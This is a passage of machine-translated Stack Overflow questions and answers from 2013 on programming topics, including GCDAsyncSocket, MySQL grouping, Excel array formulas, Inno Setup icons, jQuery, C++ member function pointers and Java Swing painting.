令人难以置信的是，调用“writeDelayed”方法（仅将“writeData”方法排入队列）可以正确处理所有读取。从方法中删除“writeData”会禁用读取。

这让我觉得配置的 GCD 调度队列是错误的，所以我尝试了每一个新的和默认的串行和并发队列

或者套接字对象在它的时间之前被释放，所以我将它设置为一个类属性，但无济于事。

可能使事情复杂化的一件事（尽管我不知道如何）是正在建立连接以响应已解析的 NSNetService (Bonjour) 对象，该对象可能位于不同的调度队列中。但是我尝试将“setupConnection”包装在要在主队列上执行的块中，但无济于事。

这里是一小部分代码，如果有任何问题我会编辑。

谢谢你，詹姆斯

```
-(void)setupConnection
{
     self.queue = dispatch_queue_create(NULL, DISPATCH_QUEUE_SERIAL);

     self.socket = [[GCDAsyncSocket alloc] initWithDelegate:self delegateQueue:self.queue];
}

-(void)connect
{
     NSError *error = nil;
     if(![self.socket connectToHost:self.socketInfo.address onPort:self.socketInfo.port error:&error])
     {
          NSLog(@"I goofed: %@", error);
     }
     NSLog(@"Connecting to: %@:%i",self.socketInfo.address,self.socketInfo.port);
}

-(void)socket:(GCDAsyncSocket *)sock didConnectToHost:(NSString *)host port:(uint16_t)port
{
    NSLog(@"Connected");
    [self.socket readDataToData:[GCDAsyncSocket CRLFData] withTimeout:-1 tag:0];
}

-(void)writeDelayed
{
    double delayInSeconds = 2000000.0;
    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delayInSeconds * NSEC_PER_SEC));
    dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
        NSData* dataObj = [GCDAsyncSocket CRLFData];
        [self.socket writeData:dataObj withTimeout:-1 tag:1];
    });
}
... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:57:26.840

答案是我的对象链中较高的对象之一被提前释放，导致套接字也被提前释放。似乎是智者的话。

# java - 将 onKeyDown 绑定到特定的 webview android

> ID：15845209
> 
> 赞同：0
> 
> 时间：2013-04-05T23:28:53.980
> 
> 标签：java, android

嘿，我正在为我的 WebView 实现后键功能。我已经让它与给定的代码一起工作，但问题是我需要它为 3 个不同的 WebViews 工作，所以不会相互冲突并导致崩溃，到目前为止，它一次只适用于每个人。我的猜测是我需要将 keylistener 绑定到那个特定的 webview，但我不确定如何。例如，这是我用于 youtube 视图的代码..

```
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {

    wv_yt = (WebView) findViewById(R.id.web_youtube);

    if (event.getAction() == KeyEvent.ACTION_DOWN) {
        switch (keyCode) {
        case KeyEvent.KEYCODE_BACK:
            if (wv_yt.canGoBack() == true) {
                wv_yt.goBack();

            } else {
                finish();
            }
            return true;

        }

    }
    return super.onKeyDown(keyCode, event);
} 
```

# mysql - 提取具有多行的组

> ID：15845213
> 
> 赞同：1
> 
> 时间：2013-04-05T23:29:39.260
> 
> 标签：mysql, sql

```
CREATE TABLE `table`
    (`source` varchar(20), `eventid` varchar(9), `system` varchar(10),`accountname` varchar(10)) 
;

INSERT INTO `table`
    (`source`, `eventid`, `system` ,`accountname`)
VALUES
    ('uatapp', '528', 'bxw','jbb'),
    ('uatapp', '528', 'bxw','jbc'),
    ('nxapp', '530', 'gg','ff'),
    ('aaunswh20', '528', 'ccd','ff'),
    ('172.1.12.3', '528','vv','ff'),   
        ('172.1.12.3', '528', 'vv', 'ff'),
    ('172.1.12.3', '528','vv','ff3')
; 
```

如果我使用查询

```
SELECT   SOURCE,accountname,SYSTEM, count(*)
FROM     `table`
WHERE    eventid = '528'
GROUP BY SOURCE,accountname 
```

我得到结果

```
SOURCE  ACCOUNTNAME     SYSTEM  COUNT(*)
172.1.12.3  ff  vv  2
172.1.12.3  ff3     vv  1
aaunswh20   ff  ccd     1
uatapp  jbb     bxw     1
uatapp  jbc     bxw     1 
```

我希望结果只显示

```
SOURCE  ACCOUNTNAME     SYSTEM  COUNT(*)
172.1.12.3  ff  vv  2
172.1.12.3  ff3     vv  1
uatapp  jbb     bxw     1
uatapp  jbc     bxw     1 
```

(ie) 将源、帐户名分组为多行，而不是单行，例如 AAUNSWH20。

有人可以帮助制定查询吗？..谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:59:45.150

您可能拒绝的基本查询是正确显示源和系统的查询，但未按以下方式分组`accountname`：

```
SELECT source, system
FROM `table`
WHERE eventid = '528'
GROUP BY source, system
HAVING Count(DISTINCT accountname) >= 2; 
```

这样做的问题是，您看不到使用了哪些帐户名。这可以通过将此查询放入派生表中来完成，并连接回原始表，如下所示：

```
SELECT DISTINCT
   T.*
FROM
   `table` T
   INNER JOIN (
      SELECT source, system
      FROM `table`
      WHERE eventid = '528'
      GROUP BY source, system
      HAVING Count(DISTINCT accountname) >= 2
   ) D ON T.source = D.source
      AND T.system = D.system
WHERE
   T.eventid = '528'
; 
```

看到这个[在 Sql Fiddle 中](http://sqlfiddle.com/#!2/61e3d/1)工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:34:36.133

也许你可以使用这个：

```
SELECT   SOURCE,accountname,SYSTEM, count(*)
FROM     [table] a
WHERE    eventid = '528'
and exists (select source, COUNT(*) from [table] b
            where a.eventid = b.eventid
            and a.source = b.source
            group by source
            having COUNT(*) > 1)
GROUP BY SOURCE,system,accountname 
```

无论如何，`table`是保留关键字，因此`[]`请在您的查询中使用。

# arrays - 从与另一列中定义的值匹配的列中返回选定的值

> ID：15845224
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:30:58.270
> 
> 标签：arrays, excel, vba, pivot-table, array-formulas

我希望能够`Dept#`在比方说单元格 D2 中输入任何内容，并且在单元格 A11、A12、A13 等中已经有一个公式，它将`Subaccount`根据`Dept#`输入自动填充数字。`Subaccount`每个单元格一个。例子：

![http://i49.tinypic.com/5bhib.png](https://i.stack.imgur.com/cs9u6m.png)

一直在看 COUNTIF 数组似乎仍然无法弄清楚，或者如果不使用 VBA 甚至可能。

请注意，我不使用数据透视表或带有下拉菜单的列表。此外，样本上的单元格 F1 到 H7 将位于另一个选项卡上，并且数据表会更大，列更多。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T01:24:58.690

OP 特别声明“我不使用数据透视表”，但总体观点似乎是“要走的路”：

![SO15845224 示例](https://i.stack.imgur.com/OpyXk.gif)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:26:41.667

这是可能的，我认为您最好使用`Index()`,`Match()`和. 作为一团糟，这是您将在列中使用的内容：`Small()``Row()``A``A11`

```
{=INDEX($G$2:$G$9,MATCH(SMALL(IF($F$2:$F$9=$D$2,$F$2:$F$9,MAX($F$2:$F$9)+1)+
   ROW($F$2:$F$9)/100000,ROW()-10),$F$2:$F$9+ROW($F$2:$F$9)/100000,0))} 
```

**注意：**我忘了提到上述**需要**作为数组公式输入。

**结果：** ![输出](https://i.stack.imgur.com/G8JvJ.png)

**说明：**请记住，下面解释的步骤是虚拟完成的。

1.  第一步是只保留感兴趣的部门，并将其他部门设置为比列表中任何其他部门更大的任何其他部门。我用过`Max() + 1`. 不能在单元格中使用以下内容。

    ```
    IF($F$2:$F$9 = $D$2, $F$2:$F$9, MAX($F$2:$F$9) + 1) 
    ```

2.  更改**Dep#**的列表，以便使用`current_row_number / 100000`.

    ```
    ... + ROW($F$2:$F$9) / 100000 
    ```

3.  如果您在第 11 行，这将是第一个有效的部门编号（`ROW()-10`如果在，将给您 1 `A11`），现在列表中有行号，第一个将是第 2 行。该`Small()`函数将为您提供最小的 x：

    ```
    {=SMALL(IF($F$2:$F$9=$D$2,$F$2:$F$9,MAX($F$2:$F$9)+1)+
        ROW($F$2:$F$9)/100000,ROW()-10)} 
    ```

4.  使用`Match()`现在将为您提供 x 值的行。

    ```
    {=MATCH(SMALL(IF($F$2:$F$9=$D$2,$F$2:$F$9,MAX($F$2:$F$9)+1)+
        ROW($F$2:$F$9)/100000,ROW()-10),$F$2:$F$9+ROW($F$2:$F$9)/100000,0)} 
    ```

5.  现在您已经拥有了所有相关部门使用该`Index`功能检索相应子帐户的行。

    ```
    {=INDEX($G$2:$G$9,MATCH(SMALL(IF($F$2:$F$9=$D$2,$F$2:$F$9,MAX($F$2:$F$9)+1)+
        ROW($F$2:$F$9)/100000,ROW()-10),$F$2:$F$9+ROW($F$2:$F$9)/100000,0))} 
    ```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:25:20.167

不确定这是否足够通用，但对于提供的示例来说似乎还可以，因此至少可能是您愿意接受的指针：

在`A11`输入`=VLOOKUP($D$2,F1:$G$8,2,FALSE)`中（根据您的表格位于不同选项卡上的事实进行调整）。这假设每个部门总是至少有一个子帐户，因此比`A12`（复制到`A19`）的公式要简单一些：

> =IFERROR(VLOOKUP($D$2,INDIRECT("F"&MATCH(A11,G:G,0)+1&":$G$8"),2,FALSE),"")

我认为这证明可以满足您的要求，但我承认可能需要进行一些调整。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T00:38:31.933

我的另一个答案似乎适用于@glh 使用的样本数据，所以希望两者都是可行的！但是你（在我看来是明智的）对建议持开放态度，我想说比这两个答案中复杂的公式更好的是建立一个单独的表格，比如 Row1 每个 Dept# 在一个单独的列中并在每个 Dept# 下方输入（主要是一个“一次性”）该部门的每个可能的子帐户。然后填充`A11:A19`会容易得多，*我*认为你会有更好的控制，因为这将基于预期的组合而不是实际组合。

但我的偏好可能仍然是数据透视表。

# icons - 使用 inno setup 卸载默认图标

> ID：15845226
> 
> 赞同：7
> 
> 时间：2013-04-05T23:31:10.567
> 
> 标签：icons, inno-setup, uninstallation

我正在使用 Inno 安装程序将卸载图标添加到开始菜单文件夹。

使用 Inno Setup Script Wizard（例如我的程序），有一个默认的卸载图标![在此处输入图像描述](https://i.stack.imgur.com/PMJvD.jpg)

这是示例代码。

```
; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "My Program"
#define MyAppVersion "1.5"
#define MyAppPublisher "My Company, Inc."
#define MyAppURL "http://www.example.com/"
#define MyAppExeName "MyProg.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{9BBC9685-FB4E-4BF1-B2B4-07A46B467911}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes
OutputBaseFilename=setup
Compression=lzma
SolidCompression=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked
Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 0,6.1

[Files]
Source: "C:\Program Files (x86)\Inno Setup 5\Examples\MyProg.exe"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{cm:ProgramOnTheWeb,{#MyAppName}}"; Filename: "{#MyAppURL}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent 
```

我希望在我的软件中使用相同的卸载默认图标，以避免从互联网下载图标或创建我自己的图标。

我的 inno 设置软件的代码如下。使用此代码，卸载图标与 .exe 的图标相同。

```
; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "Remove xyz-duplicate LiDAR points"
#define MyAppVersion "0.2 Beta"
#define MyAppExeName "remove_duplicate_xyz_executable_project.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{73F937B9-0CD9-44F1-B07E-17CD2399EE13}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes
OutputBaseFilename=Remove xyz-duplicate LiDAR points
SetupIconFile=C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\iconRemoveduplicate_two_80res_small.ico
Compression=lzma
SolidCompression=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "brazilianportuguese"; MessagesFile: "compiler:Languages\BrazilianPortuguese.isl"
Name: "danish"; MessagesFile: "compiler:Languages\Danish.isl"
Name: "french"; MessagesFile: "compiler:Languages\French.isl"
Name: "german"; MessagesFile: "compiler:Languages\German.isl"
Name: "italian"; MessagesFile: "compiler:Languages\Italian.isl"
Name: "norwegian"; MessagesFile: "compiler:Languages\Norwegian.isl"
Name: "russian"; MessagesFile: "compiler:Languages\Russian.isl"
Name: "spanish"; MessagesFile: "compiler:Languages\Spanish.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked
Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 0,6.1

[Files]
Source: "C:\Program Files (x86)\Inno Setup 5\Examples\MyProg.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\_ctypes.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\_hashlib.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\_socket.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\_ssl.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\bz2.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\library.zip"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\python27.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\remove_duplicate_xyz_executable_project.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\select.pyd"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\PythonScript\Script_fun\Remove_duplicate_xyz\LiDAR_Remove_xyz_Duplicate_Point_executable_project\dist\unicodedata.pyd"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-06T11:06:57.303

如果您设置`SetupIconFile`，那么卸载 Exe 文件（例如 unins000.exe）将实现完全相同的图标。覆盖此图标显示的一种方法是在控制面板添加/删除列表部分和桌面、开始菜单等上的快捷方式部分设置自定义`UninstallDisplayIcon`。`[Setup]`在`IconFileName`这`[Icons]`两种情况下，您都必须安装自定义图标文件与您的应用程序。

```
[Setup]
SetupIconFile=C:\mysourcedir\mysetup.ico
UninstallDisplayIcon={app}\myuninstall.ico 
                        //overrides icon on Add/Remove List in Control Panel

[Files]
Source: "C:\mysourcedir\myuninstall.ico"; DestDir: "{app}"

[Icons]
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}";
 IconFilename: "{app}\myuninstall.ico" 
                       //overrides icon in Start Menu shortcut 
```

第二个是预编译 unins000.exe 并实现特定图标。虽然在某些情况下可能会很棘手（使用 unins001、unins002 等进行多次安装；自定义代码功能）

# jquery - Facebook 喜欢用 jQuery 计数

> ID：15845227
> 
> 赞同：0
> 
> 时间：2013-04-05T23:31:11.770
> 
> 标签：jquery, json, facebook, facebook-graph-api, each

我有一个小问题：我正在尝试编写一个 jQuery 函数，该函数循环遍历具有特定类的所有 div，并使用 Facebook 的 Like 计数填充它们（所需的 URL 在`rel`属性中）。问题是由于某种原因它只对最后一项生效。

HTML：

```
<div class="facebook_likes" rel="http://www.somesite.com/"></div>
<div class="facebook_likes" rel="http://www.somesite2.com/"></div>
<div class="facebook_likes" rel="http://www.somesite3.com/"></div> 
```

JS：

```
function getLikes() {
    jQuery('.facebook_likes').each(function(){
    currentdiv = jQuery(this);
        url = currentdiv.attr('rel');
    jQuery.getJSON('http://graph.facebook.com/'+url,function(data) {
       currentdiv.text((data.shares || 0)+' Likes');
    });
})

} 
```

谢谢！

PS：我正在调用文档准备好的函数。小提琴：http: [//jsfiddle.net/Mjzpm/1/](http://jsfiddle.net/Mjzpm/1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:35:24.787

答案很简单。

```
function getLikes() {
    jQuery('.facebook_likes').each(function(){
        var currentdiv = jQuery(this);
        var url = currentdiv.attr('rel');
        jQuery.getJSON('http://graph.facebook.com/'+url,function(data) {
           currentdiv.text((data.shares || 0)+' Likes');
        });
    })
} 
```

您需要在每次循环时初始化 currentDiv 和 url。当第一个 getJSON 完成时，currentDiv/url 现在等于这两个变量设置的最后一个值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-04T08:13:30.047

首先，您必须创建页面的用户名（请参阅您的页面名称@username。只需单击它...）

然后转到[https://developers.facebook.com/tools/explorer/](https://developers.facebook.com/tools/explorer/)并获取访问令牌密钥

然后编写类似的脚本

```
function facebookLikesCount(access_token)
{
var url = "https://graph.facebook.com/voucherin.ukbd?fields=likes&access_token="+access_token+"";

$.getJSON(url,function(json){
alert(json.likes);
});
}

facebookLikesCount('your accesstoken'); 
```

# ms-access - 从查询更新一个访问表

> ID：15845228
> 
> 赞同：0
> 
> 时间：2013-04-05T23:31:21.377
> 
> 标签：ms-access

也许这比它需要的更复杂，或者更简单。无论哪种方式，它一直让我发疯，我非常感谢任何帮助。

我试过搜索谷歌和堆栈溢出，以及没有成功的 Safari Book on Access，但也许我只是无法清楚地定义我想要找到它的内容。

我在 Access 中创建一个数据库。到目前为止，我有 2 个表格： 区域信息 区域信息

区域信息有一个表，其中有一个“区域”列，其中包含它所属的区域的 2 个字母缩写。（示例：AA、GB、DT）区域信息有一个表格，其中包含“缩写”以及“区域数”

我想要什么（这可能是我完全偏离基础的地方......我以前认为我可以在 mySQL 中做到这一点，但我对 Access 真的很陌生）：

我希望能够随时向区域添加新行，这将自动填充该区域中的“区域数”。

我认为需要

```
SELECT Count([Area Information].Zone) AS CountOfZone, [Area Information].Zone
FROM [Area Information]
GROUP BY [Area Information].Zone 
```

从那里开始，

```
HAVING ((([Area Information].Zone)=[Zone Information].Abbreviation)); 
```

可惜这个不行。

最后，它需要更新该列中的正确行。

如果有人能帮我解决这个问题，我将不胜感激。我一直在尝试我能想到的一切，我的 google-fu 对我很软弱。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T09:22:57.473

关系数据库设计的核心概念之一是*规范化*，这是一个花哨的词，表示“不要在多个地方‘写下’同一条信息”。

您*认为*您想将每个区域的“区域数量”存储在 [区域信息] 表中，但您已经在 [区域信息] 表中“记录”了该信息。你只需要一个方便的方法把它拉出来。

正如您所猜到的那样，聚合（GROUP BY）查询就是答案，并且像这样......

```
SELECT [Area Information].Zone, Count(*) AS [Number of Areas]
FROM [Area Information]
GROUP BY [Area Information].Zone; 
```

...会产生这样的结果：

```
Zone    Number of Areas
----    ---------------
AB      3
BC      3
NS      1
ON      2 
```

如果将该查询在 Access 中保存为“AreaCountsByZone”，那么您可以像使用您构建的其他查询中的*表*一样使用该*查询*，例如显示区域计数的查询，*而不实际将计数存储在 [Zone Information] 表本身*中。 ..

 **```
SELECT [Zone Information].Abbreviation, [Zone Information].[Zone Name], 
    AreaCountsByZone.[Number of Areas]
FROM AreaCountsByZone INNER JOIN [Zone Information] 
    ON AreaCountsByZone.Zone = [Zone Information].Abbreviation; 
```

...返回...

```
Abbreviation    Zone Name   Number of Areas
------------    ---------   ---------------
AB              Zone AB     3
BC              Zone BC     3
NS              Zone NS     1
ON              Zone ON     2 
```

随着您对 SQL 越来越熟悉，您可能会发现跳过中间的“已保存查询”并一次性完成整个操作会更方便：

```
SELECT [Zone Information].Abbreviation, [Zone Information].[Zone Name], 
    (SELECT Count(*) FROM [Area Information]
     WHERE [Area Information].Zone = [Zone Information].Abbreviation
    ) AS [Number of Areas]
FROM [Zone Information]; 
```

...产生完全相同的结果。**

# c++ - 未解析的重载函数类型

> ID：15845230
> 
> 赞同：2
> 
> 时间：2013-04-05T23:31:33.333
> 
> 标签：c++, templates, g++, function-pointers

我正在尝试编写一个模板类，该类包含对其模板参数类型的对象的引用，以及指向不返回该类的 arg 成员函数的 void 的指针。`'<unresolved function type>'`但是，我在编译时遇到错误。

```
template<class T>
class memberAction
{
public:
    memberAction(void (T::*func)() , T& object);
private:
    void (T::*m_func)();
    T& m_object;
};

template<class T>
memberAction<T>::memberAction(void (T::*func)() , T& object)
{
    m_func = func;
    m_object = object;
}

class File
{
public:
    File();
    void TELUNUS_Open();

    //memberAction<File>& getOpenAction();

private:
    memberAction<File> m_OpenAction;
};

File::File():
        m_OpenAction(TELUNUS_Open,*this)//Line with error on it
{

}

void File::Open()
{ 
    //
} 
```

使用 g++ 4.7.2 编译我收到以下错误消息：

```
StackOverloadErrorExample.cpp|31|error: no matching function for call to 'memberAction<File>::memberAction(<unresolved overloaded function type>, File&)'| 
```

似乎有类似编译器错误的其他人将指向全局函数的指针与指向成员函数的指针混淆了，但我特别声明构造函数采用指向其模板参数的成员函数的指针，并将其传递给正确类型的成员函数.

那么如何解决这个编译器错误呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:40:29.150

我相信您需要通过`&File::TELUNUS_Open`- 或者`&File::Open`，无论您实际调用它的哪个名称 - 来获取成员函数指针。`Open`具有*函数*类型`void (File::)()`，而`&File::Open`具有您真正想要的类型，即*函数指针*类型`void (File::*)()`。除此之外，您还会遇到`m_object`参考成员的问题。赋值运算符将尝试分配给未初始化的引用：

```
template<class T>
memberAction<T>::memberAction(void (T::*func)() , T& object)
{
    m_func = func;
    m_object = object;
} 
```

您应该改用构造函数初始化列表：

```
template<class T>
memberAction<T>::memberAction(void (T::*func)() , T& object)
  : m_func(func),
    m_object(object) {} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:42:18.877

这编译，我相信：

```
template< class T >
class memberAction
{
 public:
  memberAction( void (T::*)(), T& );
 private:
  void (T::*m_func)();
  T& m_object;
};

template< class T >
memberAction< T >::memberAction( void (T::*func)(), T& object )
    : m_func( func ), m_object( object )
{    
}

class File
{
 public:
  File();
  void TELUNUS_Open()
  {
   return;
  }

  //memberAction<File>& getOpenAction();

 private:
  memberAction< File > m_OpenAction;
};

File::File()
    : m_OpenAction( &File::TELUNUS_Open, *this ) //Line with error on it
{
} 
```

# java - 为什么在按下按钮之前绘制一个框？

> ID：15845232
> 
> 赞同：0
> 
> 时间：2013-04-05T23:31:39.940
> 
> 标签：java, swing, actionlistener, repaint

我对java比较陌生，我只是想编写一个在按下按钮时绘制一个框的GUI。我的问题是，我的程序在按下按钮之前绘制了框，我不知道如何解决这个问题。

这是我的控制器类：

```
import java.awt.*;
import javax.swing.*;
import java.awt.event.* ;

public class TestController extends JFrame {
private JButton enterButton;
private JPanel buttonHolder;
private Container contentPane;
private TestView view;

public TestController() {
    contentPane = getContentPane();
    enterButton = new JButton("Enter");
    buttonHolder = new JPanel();
    buttonHolder.setPreferredSize(new Dimension (600, 100));
    contentPane.add(buttonHolder, BorderLayout.SOUTH);

    buttonHolder.add(enterButton);

    view= new TestView();       
    view.setPreferredSize(new Dimension (125, 125));
    contentPane.add(view, BorderLayout.CENTER);

    enterButton.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent ae) {
            view.repaint(); 
        }
    });

}
public static void main(String[] args) {
     TestController bc = new TestController() ;
     bc.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE) ;
     bc.pack();
     bc.setVisible(true) ;  

}

} 
```

这是我的视图类：

```
import java.awt.* ;     
import java.awt.geom.*;
import javax.swing.* ;

public class TestView extends JPanel {
public TestView() {}

public void paintComponent( Graphics g ){
    super.paintComponent( g );
    Graphics2D g2= ( Graphics2D ) g;
    Rectangle2D rect= new Rectangle2D.Double(0, 0, 30, 30); 
    g2.setPaint( Color.CYAN );
    g2.fill( rect );
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:37:45.633

你有很多方法可以做到这一点。

例如，您可以将可见性设置`TestView`为 false，直到按下按钮。

```
view.setVisible(false); 
```

在你的按钮的动作监听器中：

```
view.setVisible(true); 
```

**为什么你有你的问题：**

默认情况下，您创建的每个 Visual 对象都是可见的。当您将对象添加到板上时，它因此被绘制。

此调用显示了您的对象：**contentPane.add(view, BorderLayout.CENTER);**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:57:25.813

首先，放弃您在 Swing 中控制绘制过程的错觉，但您并没有。Swing 使用由 控制的被动重绘过程，`RepaintManager`该对象负责决定应该重绘什么以及何时重绘。

`paintComponent`由 代表您作为重绘链的一部分调用，`RepaintManager`并且可能出于多种原因（许多在您的直接控制之外）而被调用。

您的代码完全按照您的要求执行。

如果你想改变组件绘制的状态，那么你应该使用某种状态变量来告诉`paintComponent`它是否应该绘制矩形......

```
private boolean paintRect = false;

public void paintComponent( Graphics g ){
    super.paintComponent( g );
    if (paintRect) {
        Graphics2D g2= ( Graphics2D ) g;
        Rectangle2D rect= new Rectangle2D.Double(0, 0, 30, 30); 
        g2.setPaint( Color.CYAN );
        g2.fill( rect );
    }
} 
```

然后，您需要提供对`TreeView`类中状态变量的某种访问。

```
public void setPaintRect(boolean paint) {
    paintRect = paint;
    repaint();
} 
```

现在，在您的`actionPerformed`方法中，您只需要设置状态...

```
enterButton.addActionListener(new ActionListener() {
    public void actionPerformed(ActionEvent ae) {
        view.setPaintRect(true); // or what ever you want.
    }
}); 
```

在旁注中。您`TreeView`应该`getPreferredSize`为其他布局管理器覆盖并返回合适的大小提示。您已经通过使用`BorderLayout`和手动设置框架的大小来摆脱它，但`TreeView`默认大小是 0x0。

看一眼

*   [执行自定义绘画](http://docs.oracle.com/javase/tutorial/uiswing/painting/)
*   [在 AWT 和 Swing 中绘画](http://www.oracle.com/technetwork/java/painting-140037.html)

更多细节

# notepad++ - 如何为更改的文本行更改 Notepad++ 背景颜色？

> ID：15845235
> 
> 赞同：6
> 
> 时间：2013-04-05T23:31:54.160
> 
> 标签：notepad++

更新（未保存）的文本行有亮粉色 (#ffc286) 背景色，更改和保存的文本行有亮绿色 (#b5ffb5)。对于任何颜色样式，此背景都是相同的。

我在 Style Configurator 中找不到它（我认为它可能是增量突出显示，但事实并非如此），它不在全局设置中，

我在 and 中寻找过这个值`C:\Program Files (x86)\Notepad++`，`C:\Users\User\AppData\Roaming\Notepad++`但它不存在。

有谁知道在哪里改？

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-07-13T00:37:01.300

转到插件>位置导航>显示列表和选项>全部清除。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-12-04T12:06:48.757

“位置历史记录”窗格底部的“全部清除”按钮附近有两个字段“标记颜色”和“保存颜色”。您可以单击此字段并在此处选择要使用的任何颜色。

# python - TypeError：一元操作数类型错误-：'str'

> ID：15845241
> 
> 赞同：7
> 
> 时间：2013-04-05T23:32:26.633
> 
> 标签：python, string, python-2.7, typeerror

